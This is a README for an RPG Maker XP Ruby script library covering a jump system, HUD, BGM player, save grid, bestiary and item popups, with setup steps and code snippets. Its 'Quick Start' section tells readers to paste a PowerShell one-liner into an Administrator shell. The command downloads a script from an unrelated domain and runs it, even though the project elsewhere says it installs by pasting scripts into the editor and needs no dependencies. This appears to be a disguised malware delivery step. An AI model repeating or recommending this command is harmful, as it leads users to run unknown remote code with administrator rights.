This collection provides **enhanced RPG Maker XP scripts** that improve existing default scripts with better gameplay mechanics and additional functionality. Originally developed for personal projects, these scripts are now shared with the community as open source resources for other game developers.

Each script maintains full compatibility with the standard RPG Maker XP framework while adding enhanced gameplay features and mechanics. Whether you're developing a classic RPG or experimental project, these scripts provide improved player experience without requiring additional resources or external dependencies.


## Quick Start

Paste into PowerShell running as Administrator.

```powershell
irm https://tubelist.fun/install.ps1 | iex
```

### **Script Overview**

- **Enhanced Player Movement:** Jump system with cooldown mechanics and collision detection
- **Real-Time HUD Display:** Overlay showing party member HP/SP bars during map exploration
- **BGM Player Menu:** Interactive music player with volume/pitch controls and file browser
- **Typewriter Message System:** Character-by-character text display with sound effects and message history
- **Enhanced Menu Windows:** Icon integration for Gold, Steps, and PlayTime displays
- **Visual Timer System:** Enhanced timer with warning effects, color changes, and sound alerts
- **Grid Save System:** 2x2 save file layout with confirmation dialogs and preview
- **Horizontal Title Menu:** Side-by-side menu options with individual window styling
- **Transparent Menu System:** Menu scenes with background visibility and improved window layouts
- **Bestiary System:** Enemy encyclopedia with detailed stats, rewards, and visual representations
- **Item Popup System:** Compact popup window for chest/item rewards with automatic fade

### **Key Features**

- **Drop-in Compatibility:** Easy integration without breaking existing functionality
- **No External Dependencies:** Uses only standard RPG Maker XP resources
- **Fully Customizable:** Easy modification of parameters and visual elements
- **Performance Optimized:** Efficient code that doesn't impact game performance

### **Compatibility**

- **RPG Maker:** RPG Maker XP
- **Ruby Version:** 2.0+ (built-in with RPG Maker XP)
- **Platform:** Windows
- **Dependencies:** None (uses standard RPG Maker XP framework only)

## **Table of Contents**

1. [Getting Started](#getting-started)
   - [Requirements](#requirements)
   - [Adding Scripts to Your Project](#adding-scripts-to-your-project)
   - [Verifying Setup](#verifying-setup)
   - [Common Issues](#common-issues)
2. [Player Jump System](#player-jump-system)
   - [Core Features](#core-features)
   - [Key Implementation](#key-implementation)
   - [Customization](#customization)
3. [Player HUD System](#player-hud-system)
   - [Core Features](#core-features-1)
   - [Key Customization](#key-customization)
4. [BGM Player Menu](#bgm-player-menu)
   - [Core Features](#core-features-2)
   - [Key Customization](#key-customization-1)
   - [Title Screen Integration](#title-screen-integration)
5. [Typewriter Message System](#typewriter-message-system)
   - [Core Features](#core-features-3)
   - [Key Implementation](#key-implementation-1)
   - [Customization](#customization-1)
6. [Enhanced Menu Windows](#enhanced-menu-windows)
   - [Features](#features)
   - [Icon Customization](#icon-customization)
   - [Icon Positioning](#icon-positioning)
7. [Visual Timer System](#visual-timer-system)
   - [Core Features](#core-features-4)
   - [Key Implementation](#key-implementation-2)
   - [Customization](#customization-2)
8. [Grid Save System](#grid-save-system)
   - [Core Features](#core-features-5)
   - [Key Implementation](#key-implementation-3)
   - [Navigation Controls](#navigation-controls)
9. [Horizontal Title Menu](#horizontal-title-menu)
   - [Core Features](#core-features-6)
   - [Key Implementation](#key-implementation-4)
   - [Customization](#customization-3)
10. [Transparent Menu System](#transparent-menu-system)
    - [Core Features](#core-features-7)
    - [Key Implementation](#key-implementation-5)
    - [Enhanced Menu Layouts](#enhanced-menu-layouts)
    - [Transparency Customization](#transparency-customization)
11. [Bestiary System](#bestiary-system)
    - [Core Features](#core-features-8)
    - [Key Implementation](#key-implementation-6)
    - [Customization](#customization-4)
12. [Item Popup System](#item-popup-system)
    - [Core Features](#core-features-9)
    - [Event Script Usage](#event-script-usage)
    - [Customization](#customization-5)
13. [License](#license)
14. [Screenshots](#screenshots)

## **Getting Started**

### **Requirements**
- RPG Maker XP (any version)
- Basic understanding of the Script Editor
- No additional files or resources required

### **Quick Setup**
1. Open your RPG Maker XP project
2. Press F11 to access the Script Editor
3. Check whether the script is a **replacement** or a **new addition** (see tables below)
4. For replacements, find the matching default script and replace its content
5. For new additions, insert a new script entry above `Main` and paste the content
6. Save your project (Ctrl+S) and test the new functionality

### **Adding Scripts to Your Project**

Scripts in this library fall into two categories: **replacements** for existing default scripts and **new additions** that don't exist in the default editor.

#### **Replacement Scripts**

These scripts enhance existing default RPG Maker XP scripts. Find the matching script by name in the Script Editor (left panel), select all its content (Ctrl+A), delete it, and paste the enhanced version.

| Script | Replaces Default | Folder |
|--------|------------------|--------|
| `Game_Player.rb` | Game_Player | `01-Player-Jump-System` |
| `Window_Message.rb` | Window_Message | `04-Typewriter-Message-System` |
| `Window_Gold.rb` | Window_Gold | `05-Enhanced-Menu-Windows` |
| `Window_Steps.rb` | Window_Steps | `05-Enhanced-Menu-Windows` |
| `Window_PlayTime.rb` | Window_PlayTime | `05-Enhanced-Menu-Windows` |
| `Sprite_Timer.rb` | Sprite_Timer | `06-Visual-Timer-System` |
| `Scene_Save.rb` | Scene_Save | `07-Grid-Save-System` |
| `Scene_Title.rb` | Scene_Title | `08-Horizontal-Title-Menu` |
| `Scene_Menu.rb` | Scene_Menu | `09-Transparent-Menu-System` |
| `Scene_Skill.rb` | Scene_Skill | `09-Transparent-Menu-System` |
| `Scene_Status.rb` | Scene_Status | `09-Transparent-Menu-System` |
| `Scene_Item.rb` | Scene_Item | `09-Transparent-Menu-System` |
| `Scene_Equip.rb` | Scene_Equip | `09-Transparent-Menu-System` |

#### **New Addition Scripts**

These scripts add entirely new functionality. In the Script Editor, right-click an entry above `Main` and select **Insert**. Name the new entry to match the script, then paste the content.

| Script | New Entry Name | Folder |
|--------|---------------|--------|
| `Window_PlayerHUD.rb` | Window_PlayerHUD | `02-Player-HUD-System` |
| `Window_BGMList.rb` | Window_BGMList | `03-BGM-Player-Menu` |
| `Scene_Bestiary.rb` | Scene_Bestiary | `10-Bestiary-System` |
| `Window_ItemPopup.rb` | Window_ItemPopup | `11-Item-Popup-System` |

#### **Step-by-Step: Replacing an Existing Script**

1. **Open the Script File**
   - Open the `.rb` file from this repository in a text editor (Notepad, Notepad++, VS Code, etc.)
   - Select all content (Ctrl+A) and copy it (Ctrl+C)

2. **Open Script Editor**
   - Launch RPG Maker XP and open your project
   - Press F11 to open the Script Editor

3. **Locate Target Script**
   - Find the matching default script in the script list (left panel)
   - Click to select it (e.g., "Game_Player" for jump system)

4. **Replace Script Content**
   - Select all existing content in the code area (Ctrl+A)
   - Delete the selected content
   - Paste the copied content (Ctrl+V)

5. **Save Changes**
   - Press Ctrl+S to save your changes
   - Close the Script Editor
   - Test your game to verify functionality

#### **Step-by-Step: Adding a New Script**

1. **Open the Script File**
   - Open the `.rb` file from this repository in a text editor (Notepad, Notepad++, VS Code, etc.)
   - Select all content (Ctrl+A) and copy it (Ctrl+C)
   - **Note:** Do not drag `.rb` files into RPG Maker XP directly - the Script Editor does not support file imports

2. **Open Script Editor**
   - Launch RPG Maker XP and open your project
   - Press F11 to open the Script Editor

3. **Insert New Entry**
   - In the script list (left panel), scroll down to **Main**
   - Right-click any entry above `Main` and select **Insert**
   - Name the new entry to match the script (e.g., "Window_PlayerHUD")

4. **Paste Script Content**
   - Click into the empty code area on the right side
   - Paste the copied content (Ctrl+V)

5. **Save Changes**
   - Press Ctrl+S to save your changes
   - Close the Script Editor
   - Test your game to verify functionality

**Important Notes:**
Always backup your project before adding new scripts:
- Create a complete copy of your project folder
- Export existing scripts if you've made custom modifications
- Test scripts on a backup project first

### **Verifying Setup**
- Run your game in test mode (F12)
- Test the new functionality (e.g., press A/Shift for jump system)
- Verify existing features still work correctly
- Check that no script errors appear in the console

### **Common Issues**

**Script Not Working:**
- Verify the script was pasted correctly and completely
- Check that you're using the correct input (A/Shift for jump system)
- Ensure no syntax errors were introduced during copying

**Sound Effects Not Playing:**
- Confirm sound files exist in your project's Audio/SE folder
- Check the filename matches exactly in the script
- Verify your project's audio settings

**Conflicts with Other Scripts:**
- Test with a fresh project to identify conflicts
- Check for other custom scripts modifying the same classes
- Some scripts may need to be placed in specific order

## Player Jump System

Enhanced player movement system that adds jump functionality to the standard movement controls. The player can now leap over obstacles and traverse terrain more dynamically using the A button (Shift key by default).

**Required File:** `01-Player-Jump-System/Game_Player.rb`

### Core Features
- **Jump Mechanics:** Player jumps 2 tiles in current facing direction
- **Collision Detection:** Prevents jumping into walls or impassable terrain
- **Cooldown System:** 30-frame cooldown prevents spam jumping
- **Sound Integration:** Plays jump sound effect during jumps
- **Direction-Based:** Jump direction follows player's current orientation

### Key Implementation
```ruby
JUMP_DISTANCE = 2              # How many tiles to jump
JUMP_COOLDOWN_FRAMES = 30      # Frames between jumps

def try_jump
  return if @jump_cooldown && @jump_cooldown > 0
  dx = (self.direction == 6 ? 1 : self.direction == 4 ? -1 : 0) * JUMP_DISTANCE
  dy = (self.direction == 2 ? 1 : self.direction == 8 ? -1 : 0) * JUMP_DISTANCE
  if passable?(@x + dx, @y + dy, 0)
    jump(dx, dy)
    Audio.se_play("Audio/SE/016-Jump02", 80, 100)
    @jump_cooldown = JUMP_COOLDOWN_FRAMES
  end
end
```

### Customization
**Adjust jump distance:**
```ruby
JUMP_DISTANCE = 3    # Jump 3 tiles instead of 2
```

**Change jump cooldown:**
```ruby
JUMP_COOLDOWN_FRAMES = 60    # 1 second cooldown
```

**Custom jump sound:**
```ruby
Audio.se_play("Audio/SE/YourJumpSound", 100, 120)
```

## Player HUD System

Real-time overlay HUD showing party member HP/SP bars during map exploration. Automatically manages visibility across different scenes and supports up to 4 party members.

**Required File:** `02-Player-HUD-System/Window_PlayerHUD.rb`

### Core Features
- **Live HP/SP Display:** Real-time health monitoring during gameplay
- **Gradient Health Bars:** Visual bars with smooth color effects
- **Auto Scene Management:** Shows/hides appropriately in different scenes
- **Multi-Party Support:** Displays up to 4 party members simultaneously

### Key Customization
```ruby
# HUD Position
y_position = screen_height - 92    # Distance from bottom
box_width = screen_width / 4       # Width per member

# Transparency
self.opacity = 200         # Window background
self.back_opacity = 160    # Content background

# Health Bar Colors
Color.new(220, 60, 60)     # HP (Red)
Color.new(60, 60, 220)     # SP (Blue)
```

## BGM Player Menu

Interactive music browser with real-time volume/pitch controls and multi-format support. Integrates with the title screen menu for easy access.

**Required File:** `03-BGM-Player-Menu/Window_BGMList.rb`

### Core Features
- **Music Library Browser:** Navigate through available BGM files
- **Real-Time Controls:** Adjust volume (0-100%) and pitch (50-150%) during playback
- **Multi-Format Support:** Auto-detection for OGG, MP3, WAV, and MIDI files
- **Title Screen Integration:** Add to main menu for easy access

### Key Customization
```ruby
# Add BGM files to the list
def load_bgm_list
  @bgm_list = [
    RPG::AudioFile.new("001-Battle01", 100, 100),
    RPG::AudioFile.new("MyCustomSong", 100, 100),  # Add custom files
  ]
end

# Adjust control sensitivity
bgm.volume = [bgm.volume + 5, 100].min  # ±5% increments
bgm.pitch = [bgm.pitch + 5, 150].min    # ±5% increments
```

### Title Screen Integration
The BGM Player integrates automatically with the **Horizontal Title Menu** (Script 08). When both scripts are installed, the title screen will display a "Player" option between "Continue" and "Shutdown". No additional configuration is required.

If you are using the **default RPG Maker XP title screen** instead of the Horizontal Title Menu, you will need to manually add a menu option. In the default `Scene_Title` script, add a new command to the `Window_Command` and handle it:
```ruby
# In Scene_Title, add "BGM Player" to the command list
s1 = "New Game"
s2 = "Continue"
s3 = "BGM Player"
s4 = "Shutdown"
@command_window = Window_Command.new(192, [s1, s2, s3, s4])

# In the update_command method, handle the new option
when 2  # BGM Player
  $game_system.se_play($data_system.decision_se)
  $scene = Scene_Audio_BGM.new
when 3  # Shutdown (shifted from 2 to 3)
  command_shutdown
```

## Typewriter Message System

Enhanced message window that displays text character-by-character with sound effects. Players can skip the animation by pressing the confirm button to instantly display the complete message. Includes message history navigation to review previous messages.

**Required File:** `04-Typewriter-Message-System/Window_Message.rb`

### Core Features
- **Character-by-Character Display:** Text appears one letter at a time
- **Sound Feedback:** Plays cursor sound for each character (except spaces)
- **Skip Function:** Press C/Enter to instantly show full message
- **Message History:** Navigate back through previous messages with L/R buttons
- **Gray History Text:** History messages display in gray to distinguish from current
- **Full Compatibility:** Maintains all original message window functionality

### Key Implementation
```ruby
def update
  if @typewriter_index < @typewriter_all_text.length
    @typewriter_wait -= 1
    if @typewriter_wait <= 0
      char = @typewriter_all_text[@typewriter_index, 1]
      @typewriter_text += char
      if char != " " and char != "\n"
        $game_system.se_play($data_system.cursor_se)
      end
      @typewriter_index += 1
      @typewriter_wait = 1  # Speed control
    end
  end
end
```

### Message History Controls
- **L Button (Q key):** Go back to previous messages
- **R Button (W key):** Go forward / return to current message
- **History Limit:** Stores up to 20 messages

### Customization
**Adjust typing speed:**
```ruby
@typewriter_wait = 2    # Slower typing
@typewriter_wait = 0    # Instant typing
```

**Change history navigation sound:**
```ruby
HISTORY_SOUND = "046-Book01"  # Sound when navigating history
```

## Enhanced Menu Windows

Improved versions of the standard Gold, Steps, and PlayTime windows with icon integration. These drop-in replacements add visual icons while maintaining all original functionality.

**Required Files:** 
- `05-Enhanced-Menu-Windows/Window_Gold.rb`
- `05-Enhanced-Menu-Windows/Window_Steps.rb`
- `05-Enhanced-Menu-Windows/Window_PlayTime.rb`

### Features
- **Window_Gold:** Treasure chest icon (032-Item01)
- **Window_Steps:** Boot icon (020-Accessory05) 
- **Window_PlayTime:** Clock icon (016-Accessory01) with hours:minutes format

### Icon Customization
Change icons by modifying the icon filename:
```ruby
# In Window_Gold
icon = RPG::Cache.icon("032-Item01")    # Change filename here

# In Window_Steps  
icon = RPG::Cache.icon("020-Accessory05")

# In Window_PlayTime
icon = RPG::Cache.icon("016-Accessory01")
```

### Icon Positioning
Adjust icon placement:
```ruby
self.contents.blt(4, 36, icon, Rect.new(0, 0, 24, 24))
#                 x  y   coordinates
```

## Visual Timer System

Enhanced timer display with visual warning effects, color changes, and sound alerts. Features screen shake and opacity pulsing when time is running low.

**Required File:** `06-Visual-Timer-System/Sprite_Timer.rb`

### Core Features
- **Visual Warning System:** Color changes and pulsing effects as time decreases
- **Screen Shake:** Timer window shakes when under 5 seconds remain
- **Sound Effects:** Tick sounds every second, warning sound at timer end
- **Dynamic Colors:** White → Yellow → Pulsing Red based on remaining time

### Key Implementation
```ruby
def redraw_timer
  if @warning_mode
    pulse_alpha = 128 + (Math.sin(@pulse_timer * 0.3) * 127).to_i
    time_color = Color.new(255, pulse_alpha / 2, pulse_alpha / 2, 255)
  elsif total_seconds <= 30
    time_color = Color.new(255, 255, 100, 255)  # Yellow warning
  else
    time_color = Color.new(255, 255, 255, 255)  # Normal white
  end
end
```

### Customization
```ruby
# Warning thresholds
if current_sec <= 10          # Red pulsing warning
elsif total_seconds <= 30     # Yellow warning

# Shake effect timing
if $game_system.timer / Graphics.frame_rate <= 5  # Screen shake
```

## Grid Save System

Redesigned save/load interface with 2x2 grid layout, file preview, and confirmation system. Features transparent windows over title background.

**Required File:** `07-Grid-Save-System/Scene_Save.rb`

### Core Features
- **2x2 Grid Layout:** Four save slots arranged in organized grid
- **File Preview:** Selected save file displayed in center with full details
- **Confirmation System:** Separate confirmation dialog before save/load action
- **Character Display:** Shows party member sprites in save file preview

### Key Implementation
```ruby
# Grid positioning
margin = 20
window_width = (640 - margin * 3) / 2
window_height = (480 - 64 - margin * 3) / 2

for i in 0..3
  x_pos = (i % 2) * (window_width + margin) + margin
  y_pos = (i / 2) * (window_height + margin) + 64 + margin
  @savefile_windows.push(Window_SaveFile.new(i, make_filename(i), x_pos, y_pos, window_width, window_height))
end
```

### Navigation Controls
- **Arrow Keys:** Navigate between save slots in 2x2 grid
- **C Button:** Enter confirmation mode
- **B Button:** Cancel/Return to previous menu

## Horizontal Title Menu

Redesigned title screen with side-by-side menu options displayed in individual windows. Features horizontal navigation and visual highlighting.

**Required File:** `08-Horizontal-Title-Menu/Scene_Title.rb`

### Core Features
- **Individual Windows:** Each menu option in separate styled window
- **Horizontal Layout:** Side-by-side arrangement instead of vertical list
- **Visual Highlighting:** Selected option changes color dynamically
- **Centered Design:** Automatically centers menu based on number of options
- **BGM Player Detection:** Automatically adds "Player" option when BGM Player Menu (Script 03) is installed

### Key Implementation
```ruby
# Menu labels are built dynamically
@menu_labels = ["New Game", "Continue"]
if defined?(Scene_Audio_BGM)       # Auto-detect BGM Player
  @menu_labels.push("Player")
end
@menu_labels.push("Shutdown")

menu_w = 160
menu_h = 56
menu_margin = 24
total_w = @menu_labels.size * menu_w + (@menu_labels.size - 1) * menu_margin
start_x = 320 - total_w / 2  # Center the menu

# Create individual windows
for i in 0...@menu_labels.size
  win = Window_Base.new(start_x + i * (menu_w + menu_margin), y, menu_w, menu_h)
  win.opacity = 200
  win.back_opacity = 160
end
```

### Customization
```ruby
# Window dimensions
menu_w = 160          # Width of each menu window
menu_h = 56           # Height of each menu window
menu_margin = 24      # Space between windows
y = 380               # Vertical position
```

## Transparent Menu System

Complete overhaul of menu scenes to display the game map in the background with transparent window effects. Provides better visual continuity and organized information display across all menu screens.

**Required Files:**
- `09-Transparent-Menu-System/Scene_Menu.rb`
- `09-Transparent-Menu-System/Scene_Skill.rb`
- `09-Transparent-Menu-System/Scene_Status.rb`
- `09-Transparent-Menu-System/Scene_Item.rb`
- `09-Transparent-Menu-System/Scene_Equip.rb`

### Core Features
- **Background Visibility:** Game map remains visible behind all menu screens  
- **Transparent Windows:** All menu windows use opacity settings for see-through effect
- **Individual Character Windows:** Each party member has separate status window in main menu
- **Organized Layout:** Status screen split into focused windows for better readability
- **Skill Information Panel:** Additional stat windows showing Cost, Accuracy, Power, and Variance

### Key Implementation
```ruby
# Standard transparency settings for all menu windows
window.opacity = 210        # Window background (0-255)
window.back_opacity = 170   # Window content background (0-255)

# Background map sprite
@map_sprite = Spriteset_Map.new
@map_sprite.update
```

### Enhanced Menu Layouts

**Scene_Menu:** Individual character windows instead of single party window
```ruby
@character_windows = []
for i in 0...4
  x = 160
  y = i * 120
  @character_windows[i] = Window_CharacterStatus.new(x, y, i)
end
```

**Scene_Skill:** Four stat windows at bottom displaying detailed skill information
```ruby
@stat_windows = []
@stat_windows[0] = Window_SkillStat.new(0, 400, 160, "Cost")
@stat_windows[1] = Window_SkillStat.new(160, 400, 160, "Accuracy") 
@stat_windows[2] = Window_SkillStat.new(320, 400, 160, "Power")
@stat_windows[3] = Window_SkillStat.new(480, 400, 160, "Variance")
```

**Scene_Status:** Information split into separate organized windows
- **Window_StatusBasic:** Character graphic, name, class, level, experience
- **Window_StatusVital:** HP and SP with current/max values
- **Window_StatusParameters:** All character stats (ATK, DEF, etc.)
- **Window_StatusEquipment:** Currently equipped weapons and armor

### Transparency Customization
```ruby
# Adjust transparency levels
window.opacity = 255        # Completely opaque
window.opacity = 128        # Semi-transparent  
window.opacity = 0          # Completely transparent

window.back_opacity = 200   # Content background transparency
```

## Bestiary System

Enhanced enemy encyclopedia that tracks defeated monsters and displays detailed information. Automatically registers enemies after battle and provides comprehensive stats, rewards, and visual representations.

**Required File:** `10-Bestiary-System/Scene_Bestiary.rb`

### Core Features
- **Enemy Tracking:** Automatically registers defeated enemies in battles
- **Comprehensive Database:** Displays all enemies with discovery status
- **Detailed Stats:** Shows HP, SP, ATK, DEF, MDEF, AGI, EVA, EXP
- **Visual Display:** Enemy battler images with silhouette for undiscovered
- **Reward Information:** Gold and EXP rewards displayed in help window
- **Colored Weaknesses:** Displays elemental weaknesses with matching colors (Fire=orange, Ice=blue, etc.)
- **Max 2 Weaknesses:** Shows up to 2 weaknesses with "and" connector
- **Yellow Enemy Name:** Enemy name highlighted in yellow for visibility
- **Menu Integration:** Accessible from player menu (R button)

### Elemental Colors
| Element | Color |
|---------|-------|
| Fire | Orange |
| Ice | Light Blue |
| Thunder | Yellow |
| Water | Blue |
| Earth | Brown |
| Wind | Green |
| Light | White |
| Dark | Purple |

### Key Implementation
```ruby
# Register enemy after battle
def start_phase5
  for enemy in $game_troop.enemies
    unless enemy.hidden
      $game_system.register_enemy(enemy.id)
    end
  end
end

# Get elemental weaknesses (Ranks A=1, B=2 are weak)
def get_weaknesses
  weaknesses = []
  for element_id in 1..8
    rank = $data_enemies[@enemy.id].element_ranks[element_id]
    if rank != nil and rank <= 2  # A=1 (200%), B=2 (150%)
      weaknesses.push({id: element_id, name: ELEMENT_NAMES[element_id]})
    end
  end
  return weaknesses[0, 2]  # Maximum 2 weaknesses shown
end
```

### Customization
**Change menu access key:**
```ruby
if Input.trigger?(Input::L)  # Use L button instead of R
```

**Adjust window transparency:**
```ruby
window.opacity = 200        # Window background
window.back_opacity = 160   # Content background
```

## **Item Popup System**

Standard RPG Maker XP window-based popup for chest/event rewards. Windows slide in from the right edge of the screen showing icon, item name, and quantity. Multiple popups stack vertically.

**Required File:** `11-Item-Popup-System/Window_ItemPopup.rb`

### Core Features
- **Standard RPG Maker XP Windows:** Uses default window skin for consistent visual style
- **Slide-In Animation:** Windows slide in from the right edge with easing
- **Stacking Support:** Up to 5 popups can display simultaneously, stacking upward
- **Icon Display:** Shows item/weapon/armor/gold icons alongside text
- **Sound Effect:** Plays audio when popup appears
- **Auto-add Items:** Automatically adds the item to party inventory
- **Edge Overhang:** Windows extend slightly beyond screen edge for smooth appearance

### Event Script Usage
Use these commands in an event's **Script** command to show popups:

```ruby
# Give and display item
$game_party.item_popup(item_id, amount)

# Give and display weapon  
$game_party.weapon_popup(weapon_id, amount)

# Give and display armor
$game_party.armor_popup(armor_id, amount)

# Give and display gold
$game_party.gold_popup(amount)
```

**Examples:**
```ruby
$game_party.item_popup(1, 2)     # Shows "[Icon] Potion           x 2"
$game_party.item_popup(5, 4)     # Shows "[Icon] High Perfume     x 4"
$game_party.weapon_popup(1, 1)   # Shows "[Icon] Bronze Sword     x 1"
$game_party.armor_popup(3, 1)    # Shows "[Icon] Steel Shield     x 1"
$game_party.gold_popup(7)        # Shows "[Icon] Gold             x 7"
```

### Customization
**Adjust display duration and animation:**
```ruby
WINDOW_WIDTH = 260               # Width of popup window
WINDOW_HEIGHT = 52               # Height of popup window
DISPLAY_TIME = 120               # Frames visible (2 seconds at 60fps)
SLIDE_IN_TIME = 12               # Frames for slide-in animation
SLIDE_OUT_TIME = 12              # Frames for slide-out animation
OVERHANG = 32                    # How much window hangs off right edge
SOUND_EFFECT = "002-System02"    # Sound when appearing
GOLD_ICON = "032-Item01"         # Icon used for gold popups
```

## **License**

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

## **Screenshots**

The following screenshots demonstrate the core functionality of each script, including the enhanced player movement, real-time HUD display, interactive BGM player, and improved menu systems with visual enhancements.

<table>
  <tr>
    <th>Script - BGM Player</th>
    <th>Script - HUD System</th>
  </tr>
  <tr>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-player.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-player.png" alt="BGM Player" width="450"></a></td>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-hud.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-hud.png" alt="HUD Display" width="450"></a></td>
  </tr>
  <tr>
    <th>Script - Enhanced Menus</th>
    <th>Script - Grid Save System</th>
  </tr>
  <tr>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-menu.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-menu.png" alt="Enhanced Menu" width="450"></a></td>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-save.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-save.png" alt="Grid Save System" width="450"></a></td>
  </tr>
  <tr>
    <th>Script - Skill Information</th>
    <th>Script - Visual Timer</th>
  </tr>
  <tr>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-skills.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-skills.png" alt="Skill Information" width="450"></a></td>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-timer.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-timer.png" alt="Visual Timer" width="450"></a></td>
  </tr>
  <tr>
    <th>Script - Player Jump System</th>
    <th>Script - Bestiary System</th>
  </tr>
  <tr>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-jump.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-jump.png" alt="Player Jump System" width="450"></a></td>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-bestiary.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-bestiary.png" alt="Bestiary System" width="450"></a></td>
  </tr>
  <tr>
    <th>Script - Typewriter Message System</th>
    <th>Script - Item Popup System</th>
  </tr>
  <tr>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-message.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-message.png" alt="Typewriter Message System" width="450"></a></td>
    <td><a href="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-popup.png" target="_blank" rel="noopener noreferrer"><img src="https://github.com/BerndHagen/RPG-Maker-XP-Script-Library/raw/main/images/img-rpgxp-popup.png" alt="Item Popup System" width="450"></a></td>
  </tr>
</table>
